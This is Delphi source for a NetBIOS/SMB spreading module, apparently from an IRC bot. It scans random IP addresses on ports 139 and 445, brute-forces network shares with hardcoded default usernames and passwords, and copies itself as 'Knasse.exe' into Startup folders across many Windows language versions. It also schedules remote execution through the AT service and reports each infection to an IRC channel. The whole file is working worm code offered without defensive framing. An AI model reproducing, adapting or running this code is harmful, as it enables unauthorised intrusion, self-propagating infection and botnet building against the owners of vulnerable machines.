   UNIT uNetBIOS;

   INTERFACE

   USES
     Windows, WinSock, WinInet, Bot;

   PROCEDURE StartNetBIOS(NumberOfThreads:WORD);

   VAR
     lpNetApiBufferFree  : FUNCTION(Buffer:Pointer) : DWORD;STDCALL;
     lpNetRemoteTOD      : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
     lpNetScheduleJobAdd : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
     OLD_NetShareEnum    : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
     NT_NetShareEnum     : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;

   IMPLEMENTATION

   TYPE
     TNetBIOS = CLASS(TObject)
     PRIVATE
       ClassA       : BYTE;
       ClassB       : BYTE;
       ClassC       : BYTE;
       ClassD       : BYTE;
       LANInfect    : BOOL;
       ISPInfect    : BOOL;
       szIPAddr     : STRING;
       szRemoteAddr : STRING;
       PROCEDURE GetISPIP;
       PROCEDURE GetRandomIP;
       PROCEDURE InfectNetBIOS;
       FUNCTION  EnumShare : BOOL;
       FUNCTION  IntToStr(I:Integer) : STRING;
       FUNCTION  DirectoryExists(CONST Dir:STRING) : BOOL;
       PROCEDURE NetRemoteExecute(szLocation:STRING);
       FUNCTION  InfectSharedResource(szRemoteName:STRING) : BOOL;
     PUBLIC
       PROCEDURE StartNetBIOS;
   END;

   CONST
     PREVIOUS_IP              = '2';
     NEXT_IP                  = '1';
     NERR_SUCCESS             = 0;
     MAX_USERNAME             = 9;
     STYPE_PRINTQ             = 1;
     MAX_PASSWORD             = 47;

   PROCEDURE TNetBIOS.GetISPIP;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY [0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     I          : Integer;
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
   BEGIN
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(nil);
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
           ClassA:=Ord(pptr^[I]^.S_un_b.s_b1);
           ClassB:=Ord(pptr^[I]^.S_un_b.s_b2);
           ClassC:=Ord(pptr^[I]^.S_un_b.s_b3);
           ClassD:=Ord(pptr^[I]^.S_un_b.s_b4);
           GOTO Abort;
         END;
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.IntToStr(I:Integer) : STRING;
   BEGIN
     Str(I,Result);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.DirectoryExists(CONST Dir:STRING) : BOOL;
   VAR
     Attr : DWORD;
   BEGIN
     Attr:=GetFileAttributes(pChar(Dir));
     Result:=(Attr<>$FFFFFFFF)AND(Attr AND FILE_ATTRIBUTE_DIRECTORY=FILE_ATTRIBUTE_DIRECTORY);
   END;

   //------------------------------------------------------------------------------
   FUNCTION IsNTBasedOS : BOOL;
   VAR
     verInfo : TOSVersionInfo;
   BEGIN
     Result:=False;
     verInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(verInfo);
     IF verInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Result:=True;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.NetRemoteExecute(szLocation:STRING);
   TYPE
     PTIME_OF_DAY_INFO = ^TTIME_OF_DAY_INFO;
     TTIME_OF_DAY_INFO = RECORD
       tod_elapsedt    : DWORD;
       tod_msecs       : DWORD;
       tod_hours       : DWORD;
       tod_mins        : DWORD;
       tod_secs        : DWORD;
       tod_hunds       : DWORD;
       tod_timezone    : LongInt;
       tod_tinterval   : DWORD;
       tod_day         : DWORD;
       tod_month       : DWORD;
       tod_year        : DWORD;
       tod_weekday     : DWORD;
     END;
     AT_INFO           = RECORD
       JobTime         : DWORD;
       DaysOfMonth     : DWORD;
       DaysOfWeek      : UCHAR;
       Flags           : UCHAR;
       Command         : pWideChar;
     END;
   VAR
     JobID        : DWORD;
     dwRemoteTime : DWORD;
     dwReturn     : DWORD;
     NetAT        : AT_INFO;
     wcCmd        : PWideChar;
     wcServer     : PWideChar;
     lpNetTOD     : PTIME_OF_DAY_INFO;
   BEGIN
     GetMem(wcCmd,1024+1);
     GetMem(wcServer,256+1);
     lpNetTOD:=NIL;

     SendData('PRIVMSG ##p#.k#& :[EXECUTE] '+szRemoteAddr+'\'+szLocation+#10);

     StringToWideChar(szRemoteAddr,wcServer,256);
     StringToWideChar(szLocation,wcCmd,1024);
     dwReturn:=lpNetRemoteTOD(pChar(szRemoteAddr),@lpNetTOD);
     IF dwReturn=NERR_Success THEN BEGIN
       //* add 2 minutes to current time
       dwRemoteTime:=(lpNetTOD.tod_hours*3600+lpNetTOD.tod_mins*60+lpNetTOD.tod_secs)*1000+lpNetTOD.tod_hunds*10;
       IF lpNetTOD.tod_timezone<>-1 THEN dwRemoteTime:=dwRemoteTime-lpNetTOD.tod_timezone*60000;
       dwRemoteTime:=dwRemoteTime+60000;                                           //* add two minutes to current remote time
       IF IsNTBasedOS THEN lpNetApiBufferFree(lpNetTOD);
       ZeroMemory(@NetAT,SizeOf(NetAT));
       NetAT.JobTime:=dwRemoteTime;
       NetAT.Command:=wcCmd;
       dwReturn:=lpNetScheduleJobAdd(pChar(wcServer),@NetAT,JobID);
     END;
     FreeMem(wcCmd);
     FreeMem(wcServer);
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.InfectSharedResource(szRemoteName:STRING) : BOOL;
   VAR
     MaxUserName : WORD;
     MaxPassword : WORD;
     I           : DWORD;
     dwRet       : DWORD;
     szFullPath  : STRING;
     nK          : Integer;
     nL          : Integer;
     nN          : Integer;
     NetResource : TNetResource;
   CONST
     PathSize    = 74;
     Path        : ARRAY[1..PathSize] OF STRING =(
                  '\',
                  '\Documents and Settings\All Users\Start Menu\Programs\Startup\',
                  '\WINDOWS\Start Menu\Programs\Startup\',
                  '\WINNT\Profiles\All Users\Start Menu\Programs\Startup\',
                  '\Documents and Settings\All Users\Kuynnistu-valikko\Ohjelmat\Kuynnistys\',
                  '\Documents and Settings\All Users\Menu Avvio\Programmi\Esecuzione automatica\',
                  '\Documents and Settings\All Users\Menu Dumarrer\Programmes\Dumarrage\',
                  '\Documents and Settings\All Users\Menu Démarrer\Programmes\Démarrage\',
                  '\Documents and Settings\All Users\Menu Iniciar\Programas\Iniciar\',
                  '\Documents and Settings\All Users\Menu Inicio\Programas\Inicio\',
                  '\Documents and Settings\All Users\Menu Start\Programma''s\Opstarten\',
                  '\Documents and Settings\All Users\Menu Start\Programy\Autostart\',
                  '\Documents and Settings\All Users\Menuen Start\Programmer\Start\',
                  '\Documents and Settings\All Users\Start Menu\Programlar\BASLANGI\',
                  '\Documents and Settings\All Users\Start Menu\Programs\StartUp\',
                  '\Documents and Settings\All Users\Start-meny\Programmer\Oppstart\',
                  '\Documents and Settings\All Users\Start-menyn\Program\Autostart\',
                  '\Dokumente und Einstellungen\All Users\Startmenu\Programme\Autostart\',
                  '\WIN95\Kuynnistu-valikko\Ohjelmat\Kuynnistys\',
                  '\WIN95\Menu Avvio\Programmi\Esecuzione automatica\',
                  '\WIN95\Menu Dumarrer\Programmes\Dumarrage\',
                  '\WIN95\Menu Iniciar\Programas\Iniciar\',
                  '\WIN95\Menu Inicio\Programas\Inicio\',
                  '\WIN95\Menu Start\Programma''s\Opstarten\',
                  '\WIN95\Menu Start\Programy\Autostart\',
                  '\WIN95\Menuen Start\Programmer\Start\',
                  '\WIN95\Start Menu\Programlar\BASLANGI\',
                  '\WIN95\Start Menu\Programs\StartUp\',
                  '\WIN95\Start-meny\Programmer\Oppstart\',
                  '\WIN95\Start-menyn\Program\Autostart\',
                  '\WIN95\Startmenu\Programme\Autostart\',
                  '\WIN98\Kuynnistu-valikko\Ohjelmat\Kuynnistys\',
                  '\WIN98\Menu Avvio\Programmi\Esecuzione automatica\',
                  '\WIN98\Menu Dumarrer\Programmes\Dumarrage\',
                  '\WIN98\Menu Iniciar\Programas\Iniciar\',
                  '\WIN98\Menu Inicio\Programas\Inicio\',
                  '\WIN98\Menu Start\Programma''s\Opstarten\',
                  '\WIN98\Menu Start\Programy\Autostart\',
                  '\WIN98\Menuen Start\Programmer\Start\',
                  '\WIN98\Start Menu\Programlar\BASLANGI\',
                  '\WIN98\Start Menu\Programs\StartUp\',
                  '\WIN98\Start-meny\Programmer\Oppstart\',
                  '\WIN98\Start-menyn\Program\Autostart\',
                  '\WIN98\Startmenu\Programme\Autostart\',
                  '\WINDOWS.000\Menu Iniciar\Programas\Iniciar\',
                  '\WINDOWS.000\Menu Inicio\Programas\Inicio\',
                  '\WINDOWS.000\Start Menu\Programs\StartUp\',
                  '\WINDOWS.000\Startmenu\Programme\Autostart\',
                  '\WINDOWS\Kuynnistu-valikko\Ohjelmat\Kuynnistys\',
                  '\WINDOWS\Menu Avvio\Programmi\Esecuzione automatica\',
                  '\WINDOWS\Menu Dumarrer\Programmes\Dumarrage\',
                  '\WINDOWS\Menu Iniciar\Programas\Iniciar\',
                  '\WINDOWS\Menu Inicio\Programas\Inicio\',
                  '\WINDOWS\Menu Start\Programma''s\Opstarten\',
                  '\WINDOWS\Menu Start\Programy\Autostart\',
                  '\WINDOWS\Menuen Start\Programmer\Start\',
                  '\WINDOWS\Start Menu\Programlar\BASLANGI\',
                  '\WINDOWS\Start Menu\Programs\StartUp\',
                  '\WINDOWS\Start-meny\Programmer\Oppstart\',
                  '\WINDOWS\Start-menyn\Program\Autostart\',
                  '\WINDOWS\Startmenu\Programme\Autostart\',
                  '\WINME\Kuynnistu-valikko\Ohjelmat\Kuynnistys\',
                  '\WINME\Menu Avvio\Programmi\Esecuzione automatica\',
                  '\WINME\Menu Dumarrer\Programmes\Dumarrage\',
                  '\WINME\Menu Iniciar\Programas\Iniciar\',
                  '\WINME\Menu Inicio\Programas\Inicio\',
                  '\WINME\Menu Start\Programma''s\Opstarten\',
                  '\WINME\Menu Start\Programy\Autostart\',
                  '\WINME\Menuen Start\Programmer\Start\',
                  '\WINME\Start Menu\Programlar\BASLANGI\',
                  '\WINME\Start Menu\Programs\StartUp\',
                  '\WINME\Start-meny\Programmer\Oppstart\',
                  '\WINME\Start-menyn\Program\Autostart\',
                  '\WINME\Startmenu\Programme\Autostart\');

     lpszPassword : ARRAY [0..MAX_PASSWORD] OF STRING = (
           '', 'password', 'letmein', 'admin', 'Admin', 'ADMIN', 'Password',
           '1', '123', 'pw', 'PW', 'Pw', 'pass', 'passwd', 'database', 'pass',
           'server', 'super', '0', ' ', 'ihavenopass', 'enable', 'xp', 'a',
           'administratör', 'Administratör', 'administrator', 'Administrator',
           'root', 'sex', 'god', 'secret', 'father', 'test', 'test123', 'penis',
           'pussy', 'temp', 'win', 'pc', 'asdf', 'pwd', 'home', 'owner',
           'login', 'Login', 'love', 'mypass');

     lpszUserName : ARRAY [0..MAX_USERNAME] OF STRING = (
           'guest', 'Guest', 'Administrator', 'administrator',
           'Administratör', 'administratör', 'root', 'Root', 'owner', 'Owner');
   BEGIN
     Result:=False;
     szRemoteName:=szRemoteAddr+'\'+szRemoteName;
     NetResource.dwType:=RESOURCETYPE_DISK;
     NetResource.lpLocalName:=NIL;
     NetResource.lpRemoteName:=pChar(szRemoteName);
     NetResource.lpProvider:=NIL;
     GetModuleFileName(GetModuleHandle(NIL),pChar(szFullPath),Length(szFullPath));
     IF IsNTBasedOS THEN BEGIN
       MaxUserName:=MAX_USERNAME;
       MaxPassword:=MAX_PASSWORD;
     END ELSE BEGIN
       MaxUserName:=0;
       MaxPassword:=0;
     END;
     FOR nK:=0 TO MaxUserName DO BEGIN
       FOR nL:=0 TO MaxPassword DO BEGIN
         dwRet:=WNetAddConnection2(NetResource,pChar(lpszPassword[nL]),pChar(lpszUserName[nK]),0);
         IF dwRet=NO_ERROR THEN BEGIN
           FOR I:=1 TO PathSize DO BEGIN
             IF DirectoryExists(NetResource.lpRemoteName+Path[I]) THEN BEGIN
               IF CopyFile(pChar(ParamStr(0)),pChar(szRemoteName+Path[I]+'Knasse.exe'),False) THEN BEGIN

                 SendData('PRIVMSG ##p#.k#& :[COPYED] Knasse.exe'#10);

                 IF IsNTBasedOS THEN NetRemoteExecute(szRemoteName+Path[I]+'Knasse.exe');
                 Result:=True;

               END;
             END;
           END;
           FOR nN:=0 TO 20 DO IF WNetCancelConnection(NetResource.lpRemoteName,True)=NO_ERROR THEN Break;
         END;
       END;
     END;
   END;

   //------------------------------------------------------------------------------
   FUNCTION TNetBIOS.EnumShare : BOOL;
   TYPE
     Share_INFO_1   = RECORD
       shi1_netname : PWideChar;
       shi1_type    : DWORD;
       shi1_remark  : LPTSTR;
     END;
     LPShare_INFO_1 =^Share_INFO_1;
   VAR
     dwK            : DWORD;
     hResume        : DWORD;
     dwReturn       : DWORD;
     dwReadEntires  : DWORD;
     dwTotalEntires : DWORD;
     szShareName    : STRING;
     wcRemoteAddr   : pWideChar;
     lpShareInfo    : LPSHARE_INFO_1;
     lpCurrentInfo  : LPSHARE_INFO_1;
   BEGIN
     Result:=False;
     GetMem(wcRemoteAddr,MAX_PATH);
     StringToWideChar(szRemoteAddr,wcRemoteAddr,MAX_PATH);
     hResume:=0;
     REPEAT
       lpShareInfo:=NIL;
       IF IsNTBasedOS THEN dwReturn:=NT_NetShareEnum(wcRemoteAddr,1,lpShareInfo,8192,dwReadEntires,dwTotalEntires,hResume)
        ELSE dwReturn:=OLD_NetShareEnum(pChar(wcRemoteAddr),1,lpShareInfo,8192,dwReadEntires,dwTotalEntires);
       IF(dwReturn<>ERROR_MORE_DATA)AND(dwReturn<>ERROR_SUCCESS) THEN Break;
       lpCurrentInfo:=lpShareInfo;
       FOR dwK:=0 TO dwReadEntires-1 DO BEGIN
         szShareName:=lpCurrentInfo.shi1_netname;
         IF lpcurrentinfo.shi1_type<>STYPE_PRINTQ THEN Result:=InfectSharedResource(szShareName);
         Inc(lpCurrentInfo);
       END;
       IF IsNTBasedOS THEN lpNetAPIBufferFree(lpShareInfo);
     UNTIL dwReturn<>ERROR_MORE_DATA;
     FreeMem(wcRemoteAddr);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.GetRandomIP;
   BEGIN
     IF szIPAddr='' THEN BEGIN
       ClassA:=Random(222)+1;
       ClassB:=Random(254)+1;
       ClassC:=Random(254)+1;
       ClassD:=Random(254)+1;
     END;
     IF(szIPAddr=NEXT_IP)AND(ClassD<255)THEN Inc(ClassD);
     IF(szIPAddr=NEXT_IP) THEN BEGIN
       IF (ClassD<255) THEN Inc(ClassD) ELSE ClassD:=1;
     END;
     IF(szIPAddr=PREVIOUS_IP) THEN BEGIN
       IF (ClassD>2)THEN Dec(ClassD,2) ELSE ClassD:=255;
     END;
     IF ISPInfect THEN BEGIN
       GETISPIP;
       ClassC:=Random(254)+1;
       ClassD:=Random(254)+1;
     END;
     IF LANInfect THEN BEGIN
       ClassA:=192;
       ClassB:=169;
       ClassC:=Random(254)+1;
       ClassD:=Random(254)+1;
     END;
     If ClassA = 127 Then Inc(ClassA);
     If ClassA = 169 Then Inc(ClassA);
     If ClassA = 10 Then Inc(ClassA);
     szIPAddr:=IntToStr(ClassA)+'.'+IntToStr(ClassB)+'.'+IntToStr(ClassC)+'.'+IntToStr(ClassD);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.InfectNetBIOS;
   VAR
     R             : BOOL;
     Connected     : BOOL;
     Sock          : TSocket;
     SockAddr      : TSockAddrIn;
   BEGIN
     R:=False;
     Connected:=False;
     szIPAddr:='';
     WHILE True DO BEGIN
       WHILE NOT InternetGetConnectedState(NIL,0) DO Sleep(1000);
       IF R=True THEN BEGIN
         IF szIPAddr=PREVIOUS_IP THEN szIPAddr:='' ELSE BEGIN
           IF szIPAddr=NEXT_IP THEN szIPAddr:=PREVIOUS_IP;
           IF szIPAddr='' THEN szIPAddr:=NEXT_IP;
         END;
       END ELSE szIPAddr:='';
       GetRandomIP;
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
       SockAddr.sin_family:=AF_INET;
       SockAddr.sin_port:=htons(139);
       SockAddr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
       IF connect(Sock,SockAddr,SizeOf(SockAddr))<>SOCKET_ERROR THEN Connected:=True
       ELSE BEGIN
         SockAddr.sin_family:=AF_INET;
         SockAddr.sin_port:=htons(445);
         SockAddr.sin_addr.S_addr:=inet_addr(pChar(szIPAddr));
         IF connect(Sock,SockAddr,SizeOf(SockAddr))<>SOCKET_ERROR THEN Connected:=True;
       END;
       IF Connected THEN BEGIN
         CloseSocket(Sock);
         szRemoteAddr:='\\'+szIPAddr;
         R:=EnumShare;
       END;
       Sleep(512);
     END;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InitNETAPIFunctions;
   VAR
     NETAPI32 : Thandle;
   BEGIN
     NETAPI32:=LoadLibrary('netapi32.dll');
     lpNetRemoteTOD:=GetProcAddress(NETAPI32,'NetRemoteTOD');
     lpNetScheduleJobAdd:=GetProcAddress(NETAPI32,'NetScheduleJobAdd');
     IF IsNTBasedOS THEN BEGIN
       NT_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
       lpNetAPIBufferFree:=GetProcAddress(NETAPI32,'NetApiBufferFree');
     END ELSE OLD_NetShareEnum:=GetProcAddress(NETAPI32,'NetShareEnum');
   END;

   //------------------------------------------------------------------------------
   PROCEDURE TNetBIOS.StartNetBIOS;
   BEGIN
     ISPInfect:=False;
     LANInfect:=False;
     IF (LANInfect=False)AND(WaitForSingleObject(CreateMutexA(NIL,False,pChar('NetBIOSThread2')),0)<>Wait_TimeOut) THEN ISPInfect:=True;
     InfectNetBios;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartRandomThread;
   VAR
     NetBIOS : TNetBIOS;
   BEGIN
     NetBIOS:=TNetBIOS.Create;
     NetBIOS.StartNetBIOS;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE StartNetBIOS(NumberOfThreads:WORD);
   VAR
     I        : WORD;
     ThreadId : Cardinal;
   BEGIN
     Randomize;
     FOR I:=1 TO NumberOfThreads DO BeginThread(NIL,0,@StartRandomThread,NIL,0,ThreadID);
   END;

   //------------------------------------------------------------------------------
   INITIALIZATION
     InitNETAPIFunctions;

   END.
